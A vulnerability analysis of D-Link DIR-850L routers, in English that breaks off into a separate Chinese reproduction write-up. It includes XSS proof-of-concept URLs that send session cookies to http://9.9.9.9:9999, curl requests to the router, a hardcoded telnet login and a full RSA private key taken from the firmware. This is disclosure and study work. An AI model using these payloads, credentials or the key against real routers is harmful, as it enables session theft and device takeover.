## 0x00 Product Description
Dlink is a multinational networking equipment manufacturing corporation.

The Dlink 860L/865L/868L/880L are wireless "Cloud" Router.

## 0x01 Vulnerabilities Summary
The Dlink 850L is a router overall badly designed with a lot of vulnerabilities.

My research in analyzing the security of Dlink routers starts from a recent security contest organized by a security company. The Dlink 850L has 2 versions of these routers with very slight hardware modifications.

The contest targeted the first version (revisionA) but I (unfortunately) received the wrong version, revisionB (thank you Amazon!), which was not eligible for the contest.

##0x02 The summary of the vulnerabilities is:
1. WAN && LAN - revA/B - XSS - CVE-2018-6527, CVE-2018-6528, CVE-2018-6529
2. LAN - revA/B - OS command injection - CVE-2018-6530

##0x03 Details - WAN && LAN - revA/B - XSS

After analyzing PHP files inside /htdocs/webinc, I found several trivial XSS vulnerabilities.

An attacker can use the XSS to target an authenticated user in order to steal the authentication cookies.

1. xss inside /htdocs/webinc/body/bsc_sms_send.php
```php
[…]
                <span class="value">
                        <input id="receiver" type="text" size="50" maxlength="15" value="<? echo $_GET["receiver"]; ?>"/>
                </span>
[…]
```
An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
http://192.168.0.1/bsc_sms_send.php?receiver="><script>window.open('http://9.9.9.9:9999/cookie.asp?msg='+document.cookie)</script><"

2. xss inside /htdocs/ webinc/js/adv_parent_ctrl_map.php
```php
[…]
                var msgArray =
                [
                        '<?echo i18n("You have successfully configured your router to use OpenDNS Parental Control.");?>',
                        '<?echo i18n("Do you want to test the function?");?>',
                        '<p><input type="button" value="<?echo i18n('Test');?>" onclick="window.open(\'http://www.opendns.com/device/welcome/?device_id=<? echo $_GET["deviceid"];?>\')" /><input type="button" value="<?echo i18n('Return');?>" onClick="self.location.href=\'adv_parent_ctrl.php\';" /></p>'
                ];
                BODY.ShowMessage('<?echo i18n("OpenDNS PARENTAL CONTROLS");?>', msgArray);
[…]
```

An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
http://192.168.0.1/adv_parent_ctrl_map.php?deviceid=whatever\');window.open(\'http://9.9.9.9:9999/cookie.asp?msg=\'+document.cookie

3. xss inside /htdocs/ webinc/js/bsc_sms_inbox.php
```php
[…]
        InitValue: function(xml)
        {
                var get_Treturn = '<?if($_GET["Treturn"]=="") echo "0"; else echo $_GET["Treturn"];?>';		
         … 
        }
[…]
```
An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
http://192.168.0.1/bsc_sms_inbox.php?Treturn=0';window.open('http://9.9.9.9:9999/cookie.asp?msg='+document.cookie);get_Treturn='1

3. Command injection in SOAP controlType url interface
The vulnerability occurs in /htdocs/cgibin which is executed by the web server for, just handles almost http requests from WAN and LAN, and my research in analyzing SOAP interface started from a security analysis report regarding UPNP protocol, then I reviewed the SOAP interface, which is handled by the soapcgi_main function in cgibin, seems to have been mostly overlooked.

Here’s the code in C to show some details about this issue:
/* Grab a pointer to the request url */
requri = getenv("REQUEST_URI");
/* goto failure if the urquri does not start with "?service=" */
if((query = strchr(requri, "?")) == NULL or strncmp(query, "?service=", strlen("?service=")))
{
    goto failure_condition;
}
/* Point the control type field pointer 9 bytes beyond the requri */ 
controlType = query + strlen("?service=");

... ...

/* Create/open a shell script using the specified control type string */
sprintf(filename, "%s/%s_%d.sh", "/var/run", controlType, getpid());
fn = fopen(filename "a+");
/* Write self-deleting command into the srcipt and execute it by "sh -c"*/
if(fn)
{
    fprintf(fn, "rm -f %s/%s_%d.sh", "/var/run", controlType, getpid());
    fclose(fn);
    sprintf(filename, "%s/%s_%d.sh", "/var/run", controlType, getpid());
    system(filename);
}


/htdocs/web/wpsacts.php:
**注意**：我分析的硬件版本是A1，固件版本是DIR-850L_REVA_FIRMWARE_1.14.B07_WW，并于2017年12月xx日在![官网下载](http://support.dlink.com/ProductInfo.aspx?m=DIR-850L)（当时官方提供的A1硬件最老的版本），另有两个补丁包，分别用于修复本文描述的漏洞和dns组件的漏洞，作者提及的A1硬件的固件包DIR850L_REVA_FW114WWb07_h2ab_beta1.bin则无法获取到，导致很多现象跟漏洞作者的发现存在出入，请知悉。

## 0x01 漏洞分析

:zero: **Firmware**

:one: **xss**

**xss漏洞** 本质缺陷在于路由器的后端未对用户的特定请求进行检查和过滤，直接将用户请求中的部分数据原原本本的回传给了用户，导致浏览器执行了里面的js脚本。作者发现了四处xss漏洞：
1. vim ./web/wpsacts.php
```php
<?echo '<?xml version="1.0" encoding="utf-8"?>';?>
<wpsreport>
        <action><?echo $_POST["action"];?></action>
        <result><?=$RESULT?></result>
        <reason><?=$REASON?></reason>
</wpsreport>
```
同样的问题也存在于/htdocs/web/wandetect.php，/htdocs/web/shareport.php，/htdocs/web/sitesurvey.php这三个文件中。

其实，还存在其他的xss漏洞，后续我会公布出来。

:two: **Retrieving admin password**

**获取web管理员密码漏洞** 本质缺陷在于Mydlink云协议在路由器端没有对发送请求的用户身份进行鉴权，导致任意用户可以请求路由器将其注册到远程的Mydlink云端，然后用户通过注册时提供的账号和密码，登陆到Mydlink云端的web管理界面，虽然协议采用https，但对通信双方而言数据是透明的，只是对中间人是加密的数据。这部分https数据中就包含明文的路由器的web管理界面密码。简言之，非管理员的局域网用户通过Mydlink云协议能够获取管理员的账号密码。

#### Mydlink UI注册：

![r1](https://wx3.sinaimg.cn/mw1024/a750c5f9gy1fmd0t3juvsj212x0etdgx.jpg)

![r2](https://wx2.sinaimg.cn/mw1024/a750c5f9gy1fmd0t5uxkfj21300gcaaw.jpg)

![r3](https://wx3.sinaimg.cn/mw1024/a750c5f9gy1fmd0t9yf2uj212y0h6wff.jpg)

![r4](https://wx2.sinaimg.cn/mw1024/a750c5f9gy1fmd0tviugmj212b0gugml.jpg)

![r5](https://wx2.sinaimg.cn/mw1024/a750c5f9gy1fmd0tzyvu1j214l0gs7di.jpg)

通过wireshark抓包获取到上述步骤中的管理员进行注册操作的数据流，实际抓到两个包，简单理解为注册包和登陆包，此处与漏洞作者的发现存在出入，作者手动模拟的时候实际发了三个包，除前两个包外，还有一个包是添加设备包。不清楚UI操作时为什么没发送抓个包，而且wiz_mydlink.php页面也不包含act=adddev的脚本代码，可能的两个原因是：
> 1.固件版本存在差异（DIR850L_REVA_FW114WWb07_h2ab_beta1.bin vs DIR-850L_REVA_FIRMWARE_1.14.B07_WW）
> 2.UI操作本身就不发送第三个包，而是路由器自身通过其他方式完成了这步操作 

查看注册包和登陆包：

1. 注册包
```python
-----------------------------------------------------------------------------------------------------------------------
POST /register_send.php HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
Content-Length: 99
Origin: http://192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://192.168.0.1/wiz_mydlink.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=9w3HkdQTvu

act=signup&lang=zh_CN&outemail=EMAIL_ADDR&passwd=PASSWD_FOR_LOGIN&firstname=beeman&lastname=the

HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
Date: Tue, 05 Dec 2017 11:10:47 GMT
Transfer-Encoding: chunked
Content-Type: text/xml

<?xml version="1.0"?>
<register_send>
<result>success</result>
<url>https://mp-cn-portal.auto.mydlink.com</url>
</register_send>
-----------------------------------------------------------------------------------------------------------------------
```

2. 登录包
```python
-----------------------------------------------------------------------------------------------------------------------
POST /register_send.php HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
Content-Length: 85
Origin: http://192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*	
Referer: http://192.168.0.1/wiz_mydlink.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=9w3HkdQTvu

act=signin&lang=zh_CN&outemail=EMAIL_ADDR&passwd=PASSWD_FOR_LOGIN&mydlink_cookie=

HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
Date: Tue, 05 Dec 2017 11:11:10 GMT
Transfer-Encoding: chunked
Content-Type: text/xml

<?xml version="1.0"?>
<register_send>
<result>success</result>
<url>https://mp-cn-portal.auto.mydlink.com</url>
</register_send>
-----------------------------------------------------------------------------------------------------------------------
```
#### Mydlink 命令行注册：

通过UI操作简单熟悉了Mydlink云协议，现在使用命令行的方式复现这步操作（由于上面的操作已经完成了注册，所以命令行模拟前需登录Mydlink云端将设备和账号注销，该步骤会触发路由器重置操作，等待其完成后再进行模拟，这里不详述直接跳过）。查看register_send.php内容：

首先，进行权限认证:
```php
if ($AUTHORIZED_GROUP < 0)
{       
        echo "Authenication fail";
}
else
{
    //init local parameter
    $fwver = query("/runtime/device/firmwareversion");
    $modelname = query("/runtime/device/modelname");
    $devpasswd = query("/device/account/entry/password");
    $action = $_POST["act"];
    $wizard_version = $modelname. "_". $fwver;
    $result = "success";
```

然后，获取请求动作，提取用户提交的POST数据重组后发往Mydlink云端：
```php
    //sign up
    $post_str_signup = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
                       "&action=sign-up&accept=accept&email=" .$_POST["outemail"]. "&password=" .$_POST["passwd"].
                       "&password_verify=" .$_POST["passwd"]. "&name_first=" .$_POST["firstname"]. "&name_last=" .$_POST["lastname"]." ";

    $post_url_signup = "/signin/";

    $action_signup = "signup";

    //sign in
    $post_str_signin = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
                "&email=" .$_POST["outemail"]. "&password=" .$_POST["passwd"]." ";

    $post_url_signin = "/account/?signin";

    $action_signin = "signin";

    //add dev (bind device)
    $post_str_adddev = "client=wizard&wizard_version=" .$wizard_version. "&lang=" .$_POST["lang"].
                "&dlife_no=" .$mydlink_num. "&device_password=" .$devpasswd. "&dfp=" .$dlinkfootprint." ";

    $post_url_adddev = "/account/?add";

    $action_adddev = "adddev";

    //main start
    if($action == $action_signup)
    {
        $post_str = $post_str_signup;
        $post_url = $post_url_signup;
        $withcookie = "";   //signup dont need cookie info
    }
    else if($action == $action_signin)
    {
        $post_str = $post_str_signin;
        $post_url = $post_url_signin;
        $withcookie = "\r\nCookie: lang=en; mydlink=pr2c11jl60i21v9t5go2fvcve2;";
    }
    else if($action == $action_adddev)
    {
        $post_str = $post_str_adddev;
        $post_url = $post_url_adddev;
    }
    else
        $result = "fail";
```
最后，手动模拟发包，注意两点：
>1. 我测试的固件版本对云协议操作存在权限校验，所以需要提供一个合法的cookie。
>2. 由于上面UI操作时发送两个数据包就能完成该工作，所以我也决定只发两个包进行尝试。

第一个请求 (signup)会在MyDlink服务上创建一个用户:

```python
-----------------------------------------------------------------------------------------------------------------------
curl -v  -H 'Cookie:uid=paYh93tqw4' -d 'act=signup&lang=zh_CN&outemail=EMAIL_ADDR&passwd=PASSWD_FOR_LOGIN&firstname=beeman&lastname=the' http://192.168.100.1/register_send.php
*   Trying 192.168.100.1...
* Connected to 192.168.100.1 (192.168.100.1) port 80 (#0)
> POST /register_send.php HTTP/1.1
> Host: 192.168.100.1
> User-Agent: curl/7.47.0
> Accept: */*
> Cookie:uid=paYh93tqw4
> Content-Length: 99
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 99 out of 99 bytes
< HTTP/1.1 200 OK
< Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
< Date: Mon, 11 Dec 2017 12:10:12 GMT
< Transfer-Encoding: chunked
< Content-Type: text/xml
< 
<?xml version="1.0"?>
<register_send>
	<result>success</result>
	<url>https://mp-cn-portal.auto.mydlink.com</url>
</register_send>
-----------------------------------------------------------------------------------------------------------------------
```

第二个请求 (signin)路由器会将登录Mydlink云端，用于判断注册请求是否申请成功：

```python
-----------------------------------------------------------------------------------------------------------------------
curl -v  -H 'Cookie:uid=paYh93tqw4' -d 'act=signin&lang=zh_CN&outemail=EMAIL_ADDR&passwd=PASSWD_FOR_LOGIN&mydlink_cookie=' http://192.168.100.1/register_send.php
*   Trying 192.168.100.1...
* Connected to 192.168.100.1 (192.168.100.1) port 80 (#0)
> POST /register_send.php HTTP/1.1
> Host: 192.168.100.1
> User-Agent: curl/7.47.0
> Accept: */*
> Cookie:uid=paYh93tqw4
> Content-Length: 85
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 85 out of 85 bytes
< HTTP/1.1 200 OK
< Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
< Date: Mon, 11 Dec 2017 12:12:17 GMT
< Transfer-Encoding: chunked
< Content-Type: text/xml
< 
<?xml version="1.0"?>
<register_send>
	<result>success</result>
	<url>https://mp-cn-portal.auto.mydlink.com</url>
</register_send>
-----------------------------------------------------------------------------------------------------------------------
```
按照代码逻辑，应该需要发送第三个包'act=adddev'，这个包会将路由器的web管理密码发送给Mydlink云端，这样攻击者访问云端时才能获取到该路由器的管理密码。但实际测试中我们只需要发送前两个包就能完成注册，也能获取到web管理密码，佐证如下：

![login](http://wx1.sinaimg.cn/mw690/a750c5f9gy1fmd4pzeyl5j216h0mzjzm.jpg)

#### 总结与思考

:question:如何抓取路由器发往Mydlink云端的数据包？

首选当然是登录到路由器上直接抓取WAN口网卡，但测试版本固件未直接启动登录服务，只能通过利用![路由器的其他漏洞](https://github.com/TheBeeMan/DLink-850L-Multiple-Vulnerabilities-Analysis)迫使其开放telnet服务，但此种利用方式并不稳定，我测试时仍然无法登录到目标路由器上。

其次，搭建二建路由环境，在路由器的上级网关处抓包，获取路由器发往Mydlink云端的http/https协议数据，在实际抓包时我设置了dns+http+https的过滤器用于获取三种协议的流量，结果发现存在解析Mydlink域名的数据，但是未抓到https数据包，故我认为抓包失败。

再者，镜像dump，在目标路由器和其上级网关之间复制流量镜像，通过laptap这种小设备就能做到，很可惜同样未捕获到。

最后，这个实验还需要重新操作N次，目的是实现Mydlink协议的流量捕获。

:question:为什么交互中缺少'act=adddev'数据包仍然可以获取管理密码？

按照代码逻辑，应该需要发送第三个包'act=adddev'，这个包会将路由器的web管理密码发送给Mydlink云端，这样攻击者访问云端时才能获取到该路由器的管理密码。
实际测试缺少这个数据包仍然利用成功，说明路由器通过其他方式发送出了自己的管理密码到云端，可能是某种隐式的方式。要论证，必须捕获完整的通信流量，又回到上个问题了。

:question:漏洞的本质是什么？

其实，上面两个问题都只是操作层面的问题，跟漏洞本质缺陷无关。按照漏洞作者之意，导致漏洞产生的核心是register_send.php未对请求用户的身份进行鉴权，理应管理员才能请求成功，普通局域网用户请求会失败，然而缺乏鉴权导致普通用户也能获取到管理密码。

只是实际测试中已无法论证作者的观点，存在漏洞的固件版本已经不复存在，我们验证的版本有身份验证，不存在漏洞。

:three: **Weak Cloud protocol**

(reserved)

:four: **Backdoor access**

**后门程序** 本质缺陷在于特定场景下，路由器会启动telnetd登录服务，其账号密码是硬编码在固件中的，通过逆向手段能够获取到。作者声称“在revB镜像中，如果重置设备，/etc/init0.d/S80mfcd.sh脚本会被执行”，先查看S80mfcd.sh的内容：
```sh
#!/bin/sh
echo [$0]: $1 ... > /dev/console
orig_devconfsize=`xmldbc -g /runtime/device/devconfsize` 
entn=`devdata get -e ALWAYS_TN`
if [ "$1" = "start" ] && [ "$entn" = "1" ]; then
        mfcd -i br0 -t 99999999999999999999999999999 &
        exit
fi

if [ "$1" = "start" ] && [ "$orig_devconfsize" = "0" ]; then

        if [ -f "/usr/sbin/login" ]; then
                image_sign=`cat /etc/config/image_sign`
                mfcd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
        else
                mfcd &
        fi 
else
        killall mfcd
fi
```

mfcd其实就是telnetd，如果特定条件成立，“mfcd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &”命令将被运行，其中Alphanetworks是账户，$image_sign是密码。作者经过测试，能够成功登录路由器，拿到shell。

但我的硬件版本是A1，虽然同样存在/etc/init0.d/S80telnetd.sh脚本，重置设备后未被执行，先查看S80telnetd.sh的内容：
```sh
#!/bin/sh
orig_devconfsize=`xmldbc -g /runtime/device/devconfsize`
echo [$0]: $1 ... > /dev/console
if [ "$1" = "start" ] && [ "$orig_devconfsize" = "0" ]; then
	if [ -f "/usr/sbin/login" ]; then
		image_sign=`cat /etc/config/image_sign`
		telnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
	else
		telnetd &
	fi
else
	killall telnetd
fi
```
经分析发现未启动的原因是$orig_devconfsize的值不为0。
```sh
curl -H 'Cookie:uid=DNApHZrhDl' -d 'SERVICES=RUNTIME.DEVICE' http://192.168.100.1/getcfg.php

<?xml version="1.0" encoding="utf-8"?>
<postxml>
<module>
	<service>RUNTIME.DEVICE</service>
	<runtime>
		<device>
			<fptime>1000</fptime>
			<bootuptime>70</bootuptime>
			[...]
			<devconfsize>4781</devconfsize>
			[...]
```

尽管如此，该漏洞仍有存在的可能性，只是无法确定脚本中的判断条件是在何种情况下成立而已。

:five: **Stunnel private keys**

**Stunnel私钥泄漏** 本质缺陷是将stunnel server（即http/https服务）的证书硬编码在固件中，通过逆向分析能够拿到私钥和公钥信息，这种情况下即使存在https协议，仍然可以通过中间人攻击的手段获取明文数据。查看公私钥文件：

```sh
ls stunnel* 
stunnel_cert.pem  stunnel.conf  stunnel.key
```
查看私钥文件内容：

```txt
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAo/0bZcpc3Npc89YiNcP+kPxhLCGLmYXR4rHLt2I1BbnkXWHk
MY1Umfq9FAzBYSvPYEGER4gYq467yvp5wO97CUoTSJHbJDPnp9REj6wLcMkG7R9O
g8/WuQ3hsoexPu4YkjJXPhtQ6YkV7seEDgP3C2TNqCnHdXzqSs7+vT17chwu8wau
j/VMVZ2FRHU63JQ9DG6PqcudHTW+T/KVnmWXQnspgr8ZMhXobETtdqtRPtxbA8mE
ZeF8+cIoA9VcqP09/VMBbRm+o5+Q4hjtvSrv+W2bEd+BDU+V45ZX8ZfPoEWYjQqI
kv7aMECTIX2ebgKsjCK3PfYUX5PYbVWUV+176wIDAQABAoIBAQCQR/gcBgDQO7t+
uc9dmLTYYYUpa9ZEW+3/U0kWbuyRvi1DUAaS5nMiCu7ivhpCYWZSnTJCMWbrQmjN
vLT04H9S+/6dYd76KkTOb79m3Qsvz18tr9bHuEyGgsUp66Mx6BBsSKhjt2roHjnS
3W29WxW3y5f6NdAM+bu12Ate+sIq8WHsdU0hZD+gACcCbqrt4P2t3Yj3qA9OzzWb
b9IMSE9HGWoTxEp/TqbKDl37Zo0PhRlT3/BgAMIrwASb1baQpoBSO2ZIcwvof31h
IfrbUWgTr7O2Im7OiiL5MzzAYBFRzxJsj15mSm3/v3cZwK3isWHpNwgN4MWWInA1
t39bUFl5AoGBANi5fPuVbi04ccIBh5dmVipy5IkPNhY0OrQp/Ft8VSpkQDXdWYdo
MKF9BEguIVAIFPQU6ndvoK99lMiWCDkxs2nuBRn5p/eyEwnl2GqrYfhPoTPWKszF
rzzJSBKoStoOeoRxQx/QFN35/LIxc1oLv/mFmZg4BqkSmLn6HrFq2suVAoGBAMG1
CqmDs2vU43PeC6G+51XahvRI3JOL0beUW8r882VPUPsgUXp9nH3UL+l9/cBQQgUC
n12osLOAXhWDJWvJquK9HxkZ7KiirNX5eJuyBeaxtOSfBJEKqz/yGBRRVBdBHxT2
a1+gO0MlG6Dtza8azl719lr8m6y2O9pyIeUewUl/AoGAfNonCVyls0FwL57n+S2I
eD3mMJtlwlbmdsI1UpMHETvdzeot2JcKZQ37eIWyxUNSpuahyJqzTEYhf4kHRcO/
I0hvAe7UeBrLYwlZquH+t6lQKee4km1ULcWbUrxHGuX6aPBDBkG+s75/eDyKwpZA
S0RPHuUv2RkQiRtxsS3ozB0CgYEAttDCi1G82BxHvmbl23Vsp15i19KcOrRO7U+b
gmxQ2mCNMTVDMLO0Kh1ESr2Z6xLT/B6Jgb9fZUnVgcAQZTYjjXKoEuygqlc9f4S/
C1Jst1koPEzH5ouHLAa0KxjGoFvZldMra0iyJaCz/qHw6T4HXyALrbuSwOIMgxIM
Y00vZskCgYAuUwhDiJWzEt5ltnmYOpCMlY9nx5qJnfcSOld5OHZ0kUsRppKnHvHb
MMVyCTrp1jiH/o9UiXrM5i79fJBk7NT7zqKdI0qmKTQzNZhmrjPLCM/xEwAXtQMQ
1ldI69bQEdRwQ1HHQtzVYgKA9XCmvrUGXRq6E5sp2ky+X1QabC7bIg==
-----END RSA PRIVATE KEY-----
```

查看公钥文件内容：

```txt
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            87:6f:88:76:87:df:e7:78
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=TW, ST=Taiwan, O=None, OU=None, CN=General Root CA/emailAddress=webmaster@localhost
        Validity
            Not Before: Feb 22 06:04:36 2012 GMT
            Not After : Feb 17 06:04:36 2032 GMT
        Subject: C=TW, ST=Taiwan, L=HsinChu, O=None, OU=None, CN=General Router/emailAddress=webmaster@localhost
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:a3:fd:1b:65:ca:5c:dc:da:5c:f3:d6:22:35:c3:
                    fe:90:fc:61:2c:21:8b:99:85:d1:e2:b1:cb:b7:62:
                    35:05:b9:e4:5d:61:e4:31:8d:54:99:fa:bd:14:0c:
                    c1:61:2b:cf:60:41:84:47:88:18:ab:8e:bb:ca:fa:
                    79:c0:ef:7b:09:4a:13:48:91:db:24:33:e7:a7:d4:
                    44:8f:ac:0b:70:c9:06:ed:1f:4e:83:cf:d6:b9:0d:
                    e1:b2:87:b1:3e:ee:18:92:32:57:3e:1b:50:e9:89:
                    15:ee:c7:84:0e:03:f7:0b:64:cd:a8:29:c7:75:7c:
                    ea:4a:ce:fe:bd:3d:7b:72:1c:2e:f3:06:ae:8f:f5:
                    4c:55:9d:85:44:75:3a:dc:94:3d:0c:6e:8f:a9:cb:
                    9d:1d:35:be:4f:f2:95:9e:65:97:42:7b:29:82:bf:
                    19:32:15:e8:6c:44:ed:76:ab:51:3e:dc:5b:03:c9:
                    84:65:e1:7c:f9:c2:28:03:d5:5c:a8:fd:3d:fd:53:
                    01:6d:19:be:a3:9f:90:e2:18:ed:bd:2a:ef:f9:6d:
                    9b:11:df:81:0d:4f:95:e3:96:57:f1:97:cf:a0:45:
                    98:8d:0a:88:92:fe:da:30:40:93:21:7d:9e:6e:02:
                    ac:8c:22:b7:3d:f6:14:5f:93:d8:6d:55:94:57:ed:
                    7b:eb
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            Netscape Comment: 
                OpenSSL Generated Certificate
            X509v3 Subject Key Identifier: 
                B5:BF:D1:A5:D6:6F:20:B0:89:1F:A6:C1:58:05:31:B2:B3:D0:C1:01
            X509v3 Authority Key Identifier: 
                keyid:5D:F8:E9:B5:F1:57:A4:90:94:BB:9F:DB:F7:91:95:E7:1C:A2:E7:D2

    Signature Algorithm: sha1WithRSAEncryption
        3d:09:22:d0:a6:7d:9c:cd:bd:5b:ad:62:c2:6a:29:12:d1:61:
        88:ca:1e:68:1d:04:dd:40:fb:a9:d3:9f:22:49:dc:fa:fb:3c:
        21:dd:45:a5:53:1a:9b:80:ee:50:16:a6:36:3a:3c:f0:39:27:
        e4:8d:70:20:03:73:7f:26:65:ac:ab:05:b1:84:ee:7c:16:43:
        ca:2f:b5:6b:44:fc:75:a1:c7:86:04:18:b4:df:b2:76:f3:88:
        fb:dc:ec:99:3d:fe:d1:7c:ea:fa:56:eb:0b:d5:69:84:48:3d:
        12:db:d1:ef:f9:89:b0:62:70:ec:be:dd:e6:ef:dd:88:cf:f4:
        e5:ff:1d:88:d5:e0:23:f0:bb:a3:df:8e:8a:05:ea:f3:dc:14:
        49:2d:46:4a:27:40:a6:fc:70:4a:f5:94:3f:94:64:d1:93:7b:
        03:12:75:67:30:ee:8c:07:e1:73:77:00:23:d6:68:20:07:7f:
        8f:4e:1d:e8:76:87:0d:4c:26:f6:56:84:e2:56:98:a0:6c:ad:
        71:21:23:a4:a6:3b:b9:8e:27:13:c2:ae:70:0f:6a:c6:be:b8:
        88:9a:0a:d7:00:39:3a:90:7e:5f:4d:22:88:4e:a6:8a:2f:42:
        b4:dc:18:a4:eb:fa:f1:04:0e:a7:e2:ff:5d:ac:cd:61:28:01:
        7e:d3:01:13
-----BEGIN CERTIFICATE-----
MIIEBDCCAuygAwIBAgIJAIdviHaH3+d4MA0GCSqGSIb3DQEBBQUAMHoxCzAJBgNV
BAYTAlRXMQ8wDQYDVQQIDAZUYWl3YW4xDTALBgNVBAoMBE5vbmUxDTALBgNVBAsM
BE5vbmUxGDAWBgNVBAMMD0dlbmVyYWwgUm9vdCBDQTEiMCAGCSqGSIb3DQEJARYT
d2VibWFzdGVyQGxvY2FsaG9zdDAeFw0xMjAyMjIwNjA0MzZaFw0zMjAyMTcwNjA0
MzZaMIGLMQswCQYDVQQGEwJUVzEPMA0GA1UECAwGVGFpd2FuMRAwDgYDVQQHDAdI
c2luQ2h1MQ0wCwYDVQQKDAROb25lMQ0wCwYDVQQLDAROb25lMRcwFQYDVQQDDA5H
ZW5lcmFsIFJvdXRlcjEiMCAGCSqGSIb3DQEJARYTd2VibWFzdGVyQGxvY2FsaG9z
dDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKP9G2XKXNzaXPPWIjXD
/pD8YSwhi5mF0eKxy7diNQW55F1h5DGNVJn6vRQMwWErz2BBhEeIGKuOu8r6ecDv
ewlKE0iR2yQz56fURI+sC3DJBu0fToPP1rkN4bKHsT7uGJIyVz4bUOmJFe7HhA4D
9wtkzagpx3V86krO/r09e3IcLvMGro/1TFWdhUR1OtyUPQxuj6nLnR01vk/ylZ5l
l0J7KYK/GTIV6GxE7XarUT7cWwPJhGXhfPnCKAPVXKj9Pf1TAW0ZvqOfkOIY7b0q
7/ltmxHfgQ1PleOWV/GXz6BFmI0KiJL+2jBAkyF9nm4CrIwitz32FF+T2G1VlFft
e+sCAwEAAaN7MHkwCQYDVR0TBAIwADAsBglghkgBhvhCAQ0EHxYdT3BlblNTTCBH
ZW5lcmF0ZWQgQ2VydGlmaWNhdGUwHQYDVR0OBBYEFLW/0aXWbyCwiR+mwVgFMbKz
0MEBMB8GA1UdIwQYMBaAFF346bXxV6SQlLuf2/eRleccoufSMA0GCSqGSIb3DQEB
BQUAA4IBAQA9CSLQpn2czb1brWLCaikS0WGIyh5oHQTdQPup058iSdz6+zwh3UWl
UxqbgO5QFqY2OjzwOSfkjXAgA3N/JmWsqwWxhO58FkPKL7VrRPx1oceGBBi037J2
84j73OyZPf7RfOr6VusL1WmESD0S29Hv+YmwYnDsvt3m792Iz/Tl/x2I1eAj8Luj
346KBerz3BRJLUZKJ0Cm/HBK9ZQ/lGTRk3sDEnVnMO6MB+FzdwAj1mggB3+PTh3o
docNTCb2VoTiVpigbK1xISOkpju5jicTwq5wD2rGvriImgrXADk6kH5fTSKITqaK
L0K03Bik6/rxBA6n4v9drM1hKAF+0wET
-----END CERTIFICATE-----
```
但我认为这两个文件并非stunnel服务运行时真正使用的证书，它们只是在发版时未被清理的临时文件，可以通过浏览器去访问https服务，查看证书内容：
![acccess_stunnel_server](http://wx1.sinaimg.cn/mw690/a750c5f9gy1fmfesfij7aj20ll0n2t9t.jpg)

不难发现两个证书并非同一个文件，其序列号、有效期、签发者信息都完全对不上，所以我认为作者描述的这个漏洞不存在。

:six: **Nonce bruteforcing for DNS configuration**

**Nonce值可爆破** 根本缺乏在于“htdocs/parentalcontrols/bind.php 文件可以更改DNS配置信息，并不检查管理用户的认证状态。因为对HTTP请求没有限制和认证，攻击者可以采取暴力方式破解nonce，查看bind.php内容：
```php
 9 if(query(INF_getinfpath($WAN1)."/open_dns/nonce")!=$_GET["nonce"] || $_GET["nonce"]=="")
 10 {
 11         $Response="BindError";
 12 }
 [...]
 21         set(INF_getinfpath($WAN1)."/open_dns/deviceid", $_GET["deviceid"]);
 22         set(INF_getinfpath($WAN1)."/open_dns/parent_dns_srv/dns1", $_GET["dnsip1"]);
 23         set(INF_getinfpath($WAN1)."/open_dns/parent_dns_srv/dns2", $_GET["dnsip2"]);
[...]
```
"攻击者可以暴力猜测nonce的值，绕过验证，然后更改路由器的dns服务器为自己控制的主机"（引述作者观点），诚然如此。

:seven: **Weak files permission and credentials stored in cleartext**

(reserved)

:eight: **Pre-Auth RCEs as root (L2)**

这个问题分割成两个漏洞，还未研究清楚。

1. 第一个漏洞：目前的理解是假如攻击者是路由器的DHCP服务器控制者，路由器发来DHCP request之后，攻击者回复DHCP response数据中包含恶意命令的domain-name参数（注入点），导致路由器执行这部分恶意命令。

2. 第二个漏洞：目前的理解是/etc/services/INET/inet_ipv4.php这个文件中的"DOMAIN=$domain"这句话能被注入，假如攻击者是路由器的的DHCP服务器，由器发来DHCP request之后，攻击者回复DHCP response数据中包含domain参数（注入点），导致路由器执行/etc/services/INET/inet_ipv4.php脚本时将domain参数写入到"/var/servd/".$inf."-udhcpc.sh"文件中，总之 /var/servd/目录下的某些文件被恶意篡改了。

:nine: **DoS against some daemons**
